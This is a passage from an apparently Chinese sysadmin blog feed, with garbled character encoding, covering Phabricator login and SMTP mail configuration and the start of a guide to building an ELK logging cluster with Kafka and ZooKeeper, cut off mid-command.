&lt;h3 id=&quot;1-1-ä¿®æ”¹ç™»å½•æ–¹å¼&quot;&gt;&lt;a href=&quot;#1-1-ä¿®æ”¹ç™»å½•æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;1.1 ä¿®æ”¹ç™»å½•æ–¹å¼&quot;&gt;&lt;/a&gt;1.1 ä¿®æ”¹ç™»å½•æ–¹å¼&lt;/h3&gt;&lt;p&gt;ç½‘é¡µä¸Šå¯ä»¥å¯¹å…¶è¿›è¡Œç›¸åº”çš„ä¿®æ”¹ã€‚å…·ä½“ä½ç½®åœ¨ï¼š&lt;br&gt;å·¦ä¾§èœå•&lt;code&gt;Auth -&amp;gt; Add Provider -&amp;gt; username/password&lt;/code&gt;(è´¦å·å¯†ç æ–¹å¼ç™»å½•)&lt;br&gt;æ”¯æŒ è´¦å·å¯†ç ç™»å½•ä»¥åŠç¬¬ä¸‰æ–¹ï¼ˆfacebookã€githubç­‰ï¼‰è´¦å·ç™»å½•ã€‚å¦å¤–ï¼Œå¯ä»¥é€‰æ‹©ç”¨æˆ·è‡ªä¸»æ³¨å†Œï¼Œæˆ–è€…ç¦ç”¨ï¼ˆç®¡ç†å‘˜é…ç½®ï¼‰ã€‚&lt;/p&gt;
&lt;p&gt;è¿™é‡Œé€‰æ‹©LDAPåŒæ­¥éœ€è¦å®‰è£…PHP LDAPæ‰©å±•ï¼š&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;Before you can &lt;span class=&quot;built_in&quot;&gt;set&lt;/span&gt; up or use LDAP, you need to install the PHP LDAP extension. It is not currently installed, so PHP can not talk to LDAP. Usually you can install it with `yum install php-ldap`, `apt-get install php5-ldap`, or a similar package manager command.&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;yum install php-ldap -y&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;æ³¨ï¼šå¦‚æœç¬¬ä¸€æ¬¡ç®¡ç†å‘˜ç™»å½•ä»¥åï¼Œæ²¡æœ‰ä¿®æ”¹ç™»å½•æ–¹å¼ï¼Œæ¥ç€é€€å‡ºã€‚ä¸‹æ¬¡ç™»å½•å¯èƒ½ä¼šè¢«é”ä½ï¼Œéœ€è¦ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è§£é”ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;/bin/auth recover &amp;lt;username&amp;gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;1-2-è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼&quot;&gt;&lt;a href=&quot;#1-2-è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼&quot; class=&quot;headerlink&quot; title=&quot;1.2 è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼&quot;&gt;&lt;/a&gt;1.2 è®¾ç½®ç”¨æˆ·ç™»å½•è®¤è¯æ–¹å¼&lt;/h3&gt;&lt;p&gt;ä½¿ç”¨ç®¡ç†å‘˜è´¦å·ç™»å½•ï¼Œåœ¨å·¦ä¾§çš„èœå•ä¸­é€‰æ‹© Auth ï¼Œç„¶åç‚¹å‡»å³ä¸Šä¾§ Add Providerï¼Œåœ¨åˆ—è¡¨ä¸­é€‰åˆ™ä½ éœ€è¦çš„è®¤è¯æ–¹å¼ã€‚&lt;/p&gt;
&lt;p&gt;æˆ‘é€‰æ‹©æ˜¯&lt;code&gt;Username/Password&lt;/code&gt;çš„æ–¹å¼ï¼Œå³ç”¨æˆ·è‡ªå·±æ³¨å†Œ&lt;code&gt;Phabricator&lt;/code&gt;è´¦å·ã€‚ä¸ºäº†ä¿éšœå®‰å…¨ï¼Œæˆ‘è®¾ç½®äº†åªå…è®¸å…¬å¸é‚®ç®±åœ°å€æ³¨å†Œï¼š&lt;code&gt;Config ---&amp;gt; Core Settings ---&amp;gt; Authentication ---&amp;gt; auth.email-domains&lt;/code&gt;ã€‚ä½ è¿˜å¯ä»¥é€‰æ‹© auth.require-approval ï¼Œå³æ–°æ³¨å†Œç”¨æˆ·éœ€è¦ç®¡ç†å‘˜æ‰¹å‡†ã€‚&lt;/p&gt;
&lt;h3 id=&quot;1-3-è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°&quot;&gt;&lt;a href=&quot;#1-3-è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°&quot; class=&quot;headerlink&quot; title=&quot;1.3 è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°&quot;&gt;&lt;/a&gt;1.3 è®¾ç½®é‚®ä»¶å‘é€æœåŠ¡å‚æ•°&lt;/h3&gt;&lt;p&gt;é¦–å…ˆï¼Œé…ç½® mail-adapter ï¼ˆé‚®ä»¶å‘é€æ–¹å¼ï¼‰ï¼š&lt;code&gt;Config ---&amp;gt; Core Settings ---&amp;gt; Mail ---&amp;gt; metamta.mail-adapter&lt;/code&gt;ï¼Œæˆ‘é€‰æ‹©çš„æ˜¯ PhabricatorMailImplementationPHPMailerAdapter ï¼Œé€šè¿‡SMTPçš„æ–¹å¼å‘é€é‚®ä»¶ã€‚åœ¨é€‰æ‹©å®Œä¹‹åï¼Œéœ€è¦è®¾ç½®SMTPæœåŠ¡å™¨åœ°å€ã€è´¦å·å’Œå¯†ç ï¼šConfig â€”&amp;gt; Core Settings â€”&amp;gt; PHPMailer â€”&amp;gt; metamta.mail-adapterï¼Œæ ¹æ®ä½ è‡ªå·±é‚®ç®±çš„é…ç½®ï¼Œç›¸åº”çš„è®¾ç½® phpmailer.smtp-hostã€phpmailer.smtp-portã€phpmailer.smtp-protocolã€phpmailer.smtp-userã€phpmailer.smtp-passwordã€phpmailer.smtp-encoding ã€‚&lt;/p&gt;
&lt;h3 id=&quot;2-é‚®ç®±å…³è”&quot;&gt;&lt;a href=&quot;#2-é‚®ç®±å…³è”&quot; class=&quot;headerlink&quot; title=&quot;2.é‚®ç®±å…³è”&quot;&gt;&lt;/a&gt;2.é‚®ç®±å…³è”&lt;/h3&gt;&lt;p&gt;åˆ‡æ¢åˆ°&lt;code&gt;phabricator/bin/&lt;/code&gt;ç›®å½•ä¸‹è¿è¡Œ&lt;code&gt;daemonï¼š./bin/phd start&lt;/code&gt;ã€‚ æ³¨æ„æ¯æ¬¡é‡å¯éœ€è¦å†æ¬¡å¯ç”¨ï¼Œå› æ­¤å»ºè®®æ”¾åˆ°å¯åŠ¨è„šæœ¬ä¸Šã€‚&lt;/p&gt;
&lt;p&gt;é…ç½®mailï¼šé€šè¿‡webè®¿é—®phabricatorå¹¶åœ¨é¡µé¢ä¸Šè¿›è¡Œé…ç½®ï¼šï¼ˆè¿™é‡Œä½¿ç”¨çš„æ˜¯å¤–éƒ¨SMTP serverçš„æ–¹å¼ï¼Œæ›´å¤šæ–¹å¼å‚è§phabricator docsï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ç”¨administratorè´¦å·ç™»å½•åï¼Œåœ¨administrationæ é€‰æ‹©Configè¿›å…¥
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1ï¼‰é€‰æ‹©mailï¼Œè®¾ç½®&lt;br&gt;    metamta.default-address â€“ xxxx@163.com // æ³¨æ„ï¼šè¿™é‡Œå¿…é¡»è¦ç”¨ä¸smtpæœåŠ¡å™¨å¯¹åº”çš„é‚®ç®±åœ°å€ï¼Œä¸ç„¶é‚®ä»¶å‘ä¸å‡ºå»&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;metamta.domain -- phabricator.myproject.com // éšæ„

metamta.mail-adapter: set to &amp;quot;PhabricatorMailImplementationPHPMailerAdapter&amp;quot;

metamta.send-immediately: Send Via Daemons ï¼ˆç›®å‰ç‰ˆæœ¬è²Œä¼¼æ²¡æœ‰ï¼‰
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;2ï¼‰é€‰æ‹©PHPMailerï¼Œè®¾ç½®ï¼šï¼ˆä»¥163.comçš„SMTP serverä¸ºä¾‹ï¼‰&lt;br&gt;    phpmailer.mailer: set to â€œsmtpâ€. ï¼ˆé»˜è®¤ï¼‰&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;phpmailer.smtp-host: smtp.163.com 

phpmailer.smtp-port: 25 ï¼ˆé»˜è®¤ï¼‰

phpmailer.smtp-user: xxxx

phpmailer.smtp-password: xxxx
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;ç›®å‰ç‰ˆæœ¬é¡µé¢ä¸Šä¸èƒ½é…ç½®PHPMailerï¼Œåªèƒ½ä½¿ç”¨å·¥å…·/bin/configå·¥å…·setç›¸å¯¹åº”çš„é…ç½®é¡¹ã€‚&lt;/p&gt;
&lt;figure class=&quot;highlight dsconfig&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;phabricator/&lt;/span&gt; $ ./&lt;span class=&quot;string&quot;&gt;bin/&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;mail &lt;/span&gt;&lt;span class=&quot;built_in&quot;&gt;list-outbound&lt;/span&gt;   &lt;span class=&quot;comment&quot;&gt;# List outbound mail.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;phabricator/&lt;/span&gt; $ ./&lt;span class=&quot;string&quot;&gt;bin/&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;mail &lt;/span&gt;&lt;span class=&quot;string&quot;&gt;show-outbound &lt;/span&gt;  &lt;span class=&quot;comment&quot;&gt;# Show details about messages.&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;phabricator/&lt;/span&gt; $ ./&lt;span class=&quot;string&quot;&gt;bin/&lt;/span&gt;&lt;span class=&quot;string&quot;&gt;mail &lt;/span&gt;&lt;span class=&quot;string&quot;&gt;send-test &lt;/span&gt;      &lt;span class=&quot;comment&quot;&gt;# Send test messages.&lt;/span&gt;&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h3 id=&quot;3-å‚è€ƒï¼š&quot;&gt;&lt;a href=&quot;#3-å‚è€ƒï¼š&quot; class=&quot;headerlink&quot; title=&quot;3. å‚è€ƒï¼š&quot;&gt;&lt;/a&gt;3. å‚è€ƒï¼š&lt;/h3&gt;&lt;p&gt;&lt;a href=&quot;https://www.oschina.net/question/191440_125562&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.oschina.net/question/191440_125562&lt;/a&gt;  Phabricatorå…¥é—¨æ‰‹å†Œ&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/zzllabcd/article/details/49997421&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/zzllabcd/article/details/49997421&lt;/a&gt; 10.04Ubuntuå®‰è£…&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/clovn/p/5103611.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/clovn/p/5103611.html&lt;/a&gt; debian7å®‰è£…&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://secure.phabricator.com/book/phabricator/article/installation_guide/&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://secure.phabricator.com/book/phabricator/article/installation_guide/&lt;/a&gt; å®˜æ–¹guider&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://liuzhichao.com/p/1992.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://liuzhichao.com/p/1992.html&lt;/a&gt;  Phabricator å®è·µä¹‹é…ç½®è´¦å·å’Œæ³¨å†Œ&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.oschina.net/question/191440_125562&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://www.oschina.net/question/191440_125562&lt;/a&gt; å…¥é—¨æ‰‹å†Œ&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.jianshu.com/p/b1a75a14638c&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.jianshu.com/p/b1a75a14638c&lt;/a&gt;  ç®€ä¹¦ä¸­çš„åˆ†äº«ï¼ˆè¾ƒä¸ºå®Œæ•´ï¼‰&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://www.cnblogs.com/ToDoToTry/p/3956687.html&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://www.cnblogs.com/ToDoToTry/p/3956687.html&lt;/a&gt; git serveræ­å»ºæŒ‡å—&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://my.oschina.net/miger/blog/775609&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://my.oschina.net/miger/blog/775609&lt;/a&gt; linuxå¹³å°arcå·¥å…·çš„ä½¿ç”¨&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;http://blog.csdn.net/peapon/article/details/29881575&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;http://blog.csdn.net/peapon/article/details/29881575&lt;/a&gt; windowsä¸­arcçš„ä½¿ç”¨&lt;/p&gt;
</content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚&quot;&gt;&lt;a href=&quot;#Phabricatoræ˜¯ç”±Fackbookå¼€å‘çš„ä¸€ä¸ªå¼€æºçš„å¯è§†åŒ–ä»£ç å®¡æŸ¥å·¥å…·ã€‚&quot; class=&quot;headerlink&quot; title=&quot;Phabricatoræ˜¯ç”±F
    
    </summary>
    
      <category term="automation" scheme="http://blog.yangcvo.me/categories/automation/"/>
    
    
  </entry>
  
  <entry>
    <title>æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°</title>
    <link href="http://blog.yangcvo.me/2016/12/29/%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90%10%E5%B9%B3%E5%8F%B0/Elasticsearch/%E6%90%AD%E5%BB%BA(ElasticSearch-2.x%20Logstash-2.x%20Kibana-4.5.x%20zookeeper3.4.6)%20Kafka%E4%B8%BA%E6%B6%88%E6%81%AF%E4%B8%AD%E5%BF%83%E7%9A%84ELK%E6%97%A5%E5%BF%97%E5%B9%B3%E5%8F%B0/"/>
    <id>http://blog.yangcvo.me/2016/12/29/æ—¥å¿—åˆ†æå¹³å°/Elasticsearch/æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°/</id>
    <published>2016-12-29T09:56:03.000Z</published>
    <updated>2017-04-20T06:43:34.000Z</updated>
    
    <content type="html">&lt;h3 id=&quot;æ­å»º-ElasticSearch-2-x-Logstash-2-x-Kibana-4-5-x-zookeeper3-4-6-Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°&quot;&gt;&lt;a href=&quot;#æ­å»º-ElasticSearch-2-x-Logstash-2-x-Kibana-4-5-x-zookeeper3-4-6-Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°&quot; class=&quot;headerlink&quot; title=&quot;æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°&quot;&gt;&lt;/a&gt;æ­å»º(ElasticSearch-2.x Logstash-2.x Kibana-4.5.x zookeeper3.4.6) Kafkaä¸ºæ¶ˆæ¯ä¸­å¿ƒçš„ELKæ—¥å¿—å¹³å°&lt;/h3&gt;&lt;h3 id=&quot;ä»‹ç»&quot;&gt;&lt;a href=&quot;#ä»‹ç»&quot; class=&quot;headerlink&quot; title=&quot;ä»‹ç»&quot;&gt;&lt;/a&gt;ä»‹ç»&lt;/h3&gt;&lt;p&gt;ELKæ˜¯ä¸šç•Œæ ‡å‡†çš„æ—¥å¿—é‡‡é›†,å­˜å‚¨ç´¢å¼•,å±•ç¤ºåˆ†æç³»ç»Ÿè§£å†³æ–¹æ¡ˆ&lt;/p&gt;
&lt;p&gt;logstashæä¾›äº†çµæ´»å¤šæ ·çš„æ’ä»¶æ”¯æŒä¸åŒçš„input/output&lt;/p&gt;
&lt;p&gt;ä¸»æµä½¿ç”¨redis/kafkaä½œä¸ºæ—¥å¿—/æ¶ˆæ¯çš„ä¸­é—´ç¯èŠ‚&lt;/p&gt;
&lt;p&gt;å¦‚æœå·²æœ‰kafkaçš„ç¯å¢ƒäº†,ä½¿ç”¨kafkaæ¯”ä½¿ç”¨redisæ›´ä½³&lt;/p&gt;
&lt;p&gt;ä»¥ä¸‹æ˜¯ä¸€ä¸ªæœ€ç®€åŒ–çš„é…ç½®åšä¸ªç¬”è®°,elasticå®˜ç½‘æä¾›äº†éå¸¸ä¸°å¯Œçš„æ–‡æ¡£&lt;/p&gt;
&lt;p&gt;ä¸è¦ç”¨æœç´¢å¼•æ“å»æœç´¢,æ²¡å¤šå°‘ç»“æœçš„,è¯·ç›´æ¥çœ‹å®˜ç½‘æ–‡æ¡£&lt;/p&gt;
&lt;h3 id=&quot;ç‰ˆæœ¬åŠè¿æ¥&quot;&gt;&lt;a href=&quot;#ç‰ˆæœ¬åŠè¿æ¥&quot; class=&quot;headerlink&quot; title=&quot;ç‰ˆæœ¬åŠè¿æ¥&quot;&gt;&lt;/a&gt;ç‰ˆæœ¬åŠè¿æ¥&lt;/h3&gt;&lt;p&gt;elasticseearchç‰ˆæœ¬: 2.4.3&lt;/p&gt;
&lt;h3 id=&quot;ç³»ç»Ÿè¦æ±‚&quot;&gt;&lt;a href=&quot;#ç³»ç»Ÿè¦æ±‚&quot; class=&quot;headerlink&quot; title=&quot;ç³»ç»Ÿè¦æ±‚&quot;&gt;&lt;/a&gt;ç³»ç»Ÿè¦æ±‚&lt;/h3&gt;&lt;p&gt;å¦‚æœä»…ä½œæµ‹è¯•ç”¨, ä¸éœ€è¦ä¸¤å¤©æœºå™¨, å¯ä»¥å°†ä¸¤ä¸ªèŠ‚ç‚¹éƒ¨ç½²åœ¨åŒä¸€å°æœºå™¨ä¸Š, å¯¹ç£ç›˜/cpuè¦æ±‚ä¸é«˜, å†…å­˜å¤§äº2gåŸºæœ¬è¶³å¤Ÿäº†&lt;/p&gt;
&lt;p&gt;å¦‚æœæ˜¯æ­£å¼ç¯å¢ƒ, éœ€è¦æ ¹æ®æ—¥å¿—é‡è¿›è¡Œè¯„ä¼°, ä¾‹å¦‚, æ¯å¤©æ—¥å¿—é‡å ç¡¬ç›˜çº¦çº¦10G, ä¸”ä¿ç•™30å¤©æ—¥å¿—, åˆ™ç£ç›˜ä¼šå ç”¨çº¦300g, esè®¾å®šçš„é˜ˆå€¼æ˜¯ç£ç›˜ç©ºé—´å æ»¡85%åˆ™æ—¥å¿—å¼€å§‹å‘Šè­¦. æ‰€ä»¥, éœ€è¦è‡³å°‘ 300/0.85=354g.&lt;/p&gt;
&lt;p&gt;å‡†å¤‡4å°æœºå™¨, åœ¨åŒä¸€ä¸ªå±€åŸŸç½‘å†…(å¯pingé€š), åˆ†åˆ«åœ¨æ¯å°æœºå™¨ä¸Šéƒ¨ç½²ç›¸åº”esèŠ‚ç‚¹, æ­å»ºä¸€å¥—æ—¥å¿—é›†ç¾¤.&lt;/p&gt;
&lt;p&gt;4å°æœºå™¨, æœ€å°‘çš„èµ„æºäº†, ä½†æ˜¯æ²¡æ³•åšåˆ°é«˜å¯ç”¨, æ‰€ä»¥, è¿˜éœ€è¦å†åŠ ä¸€å°æœºå™¨, é˜²æ­¢è„‘è£‚, å…·ä½“è§æœ€å(ä¸¤å°ä¸»åŠ›æœºå™¨+ä¸€å°ç¨³å®šçš„æœºå™¨å°±è¡Œ)&lt;/p&gt;
&lt;p&gt;é›†ç¾¤èŠ‚ç‚¹: æœ€å°‘4å°æœºå™¨&lt;br&gt;å†…å­˜: 8GåŠä»¥ä¸Š&lt;br&gt;cpu: 4æ ¸åŠä»¥ä¸Š&lt;br&gt;ç¡¬ç›˜: 800GåŠä»¥ä¸Š, å»ºè®®1T, é›†ç¾¤å®¹é‡çº¦10äº¿çº§(å–å†³äºå¯¹åº”æ—¥å¿—å¤§å°)&lt;br&gt;æ“ä½œç³»ç»Ÿ: centos&lt;/p&gt;
&lt;h3 id=&quot;å‡†å¤‡å·¥ä½œ-åº”ç”¨-ç½‘ç»œ-ç¯å¢ƒ&quot;&gt;&lt;a href=&quot;#å‡†å¤‡å·¥ä½œ-åº”ç”¨-ç½‘ç»œ-ç¯å¢ƒ&quot; class=&quot;headerlink&quot; title=&quot;å‡†å¤‡å·¥ä½œ: åº”ç”¨/ç½‘ç»œ ç¯å¢ƒ&quot;&gt;&lt;/a&gt;å‡†å¤‡å·¥ä½œ: åº”ç”¨/ç½‘ç»œ ç¯å¢ƒ&lt;/h3&gt;&lt;p&gt;SLBï¼š é˜¿é‡Œäº‘åšè´Ÿè½½å‡è¡¡&amp;amp; æˆ–è€…è‡ªå·±æ­å»ºnginx&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ELKæœåŠ¡ç«¯é›†ç¾¤ï¼š&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼šElasticsearch-2.4.0&lt;/p&gt;
&lt;p&gt;es_01 10.47.88.206&lt;br&gt;es_02 10.47.88.188&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;KibanaæœåŠ¡ç«¯é›†ç¾¤ï¼š&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼škibana-4.5.1&lt;/p&gt;
&lt;p&gt;es_01 10.47.88.206&lt;br&gt;es_02 10.47.88.188&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;KafKaé›†ç¾¤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼škafka_2.10-0.9&lt;/p&gt;
&lt;p&gt;kafka_01 10.46.72.172&lt;br&gt;kafka_02 10.47.88.103&lt;br&gt;kafka_03 10.47.102.137&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;zookeeperé›†ç¾¤&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;ç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼šzookeeper-3.4.6&lt;/p&gt;
&lt;p&gt;kafka_01 10.46.72.172&lt;br&gt;kafka_02 10.47.88.103&lt;br&gt;kafka_03 10.47.102.137&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;logstash-2.4&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;å®¢æˆ·ç«¯ï¼šç³»ç»Ÿcentos 6.7  JDK1.8  ç‰ˆæœ¬ï¼š logstash-2.4&lt;/p&gt;
&lt;p&gt;tomcat-account_01: 10.27.232.85&lt;/p&gt;
&lt;p&gt;éƒ½è¦jdk1.8æ”¯æŒã€‚&lt;/p&gt;
&lt;h3 id=&quot;æ•´ä½“è¯´æ˜&quot;&gt;&lt;a href=&quot;#æ•´ä½“è¯´æ˜&quot; class=&quot;headerlink&quot; title=&quot;æ•´ä½“è¯´æ˜&quot;&gt;&lt;/a&gt;æ•´ä½“è¯´æ˜&lt;/h3&gt;&lt;h4 id=&quot;æ•°æ®æµå‘-gt-æ—¥å¿—-æ¶ˆæ¯æ•´ä½“æµå‘&quot;&gt;&lt;a href=&quot;#æ•°æ®æµå‘-gt-æ—¥å¿—-æ¶ˆæ¯æ•´ä½“æµå‘&quot; class=&quot;headerlink&quot; title=&quot;æ•°æ®æµå‘=&amp;gt;æ—¥å¿—/æ¶ˆæ¯æ•´ä½“æµå‘&quot;&gt;&lt;/a&gt;æ•°æ®æµå‘=&amp;gt;æ—¥å¿—/æ¶ˆæ¯æ•´ä½“æµå‘&lt;/h4&gt;&lt;p&gt;logstash =&amp;gt; kafka =&amp;gt; logstash =&amp;gt; elasticsearch =&amp;gt; kibana&lt;/p&gt;
&lt;h3 id=&quot;éƒ¨ç½²&quot;&gt;&lt;a href=&quot;#éƒ¨ç½²&quot; class=&quot;headerlink&quot; title=&quot;éƒ¨ç½²&quot;&gt;&lt;/a&gt;éƒ¨ç½²&lt;/h3&gt;&lt;h4 id=&quot;1-ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…&quot;&gt;&lt;a href=&quot;#1-ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…&quot; class=&quot;headerlink&quot; title=&quot;1. ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…&quot;&gt;&lt;/a&gt;1. ç¡®è®¤JDKç‰ˆæœ¬åŠå®‰è£…&lt;/h4&gt;&lt;p&gt;esä¾èµ–javaçš„ç‰ˆæœ¬æœ€å°ä¸º1.7&lt;/p&gt;
&lt;p&gt;å¦‚æœç³»ç»Ÿä¸­æœªå®‰è£…JDK&lt;br&gt;åˆ™å‘½ä»¤è¿”å›&lt;code&gt;bash: java: command not found,&lt;/code&gt; éœ€è¦å®‰è£…&lt;code&gt;JDK&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;å¦‚æœç³»ç»Ÿä¸­å®‰è£…äº†JDK, éœ€ç¡®è®¤ç‰ˆæœ¬æ˜¯å¦å¤§äºjava 1.7, å¦åˆ™éœ€è¦å‡çº§&lt;/p&gt;
&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;12&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;java -version&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;java version &lt;span class=&quot;string&quot;&gt;&quot;1.7.0_51&quot;&lt;/span&gt; Java(TM) SE Runtime Environment (build 1.7.0_51-b13) Java HotSpot(TM) Server VM (build 24.51-b03, mixed mode)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;å®‰è£…åŠå‡çº§java(æ³¨æ„æ ¹æ®ç³»ç»Ÿä¸åŒè¿è¡Œå¯¹åº”å®‰è£…å‘½ä»¤)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Redhat/Centos/Fedora&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;sudo yum install java-1.7.0-openjdk&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;æˆ–è€…åˆ°å®˜ç½‘, ä¸‹è½½æœ€æ–°çš„jdkçš„rpmåŒ…, ç„¶åå®‰è£…&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;wget http://download.oracle.com/otn-pub/java/jdk/8u91-b14/jdk-8u91-linux-x64.rpm&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;rpm -Uvh 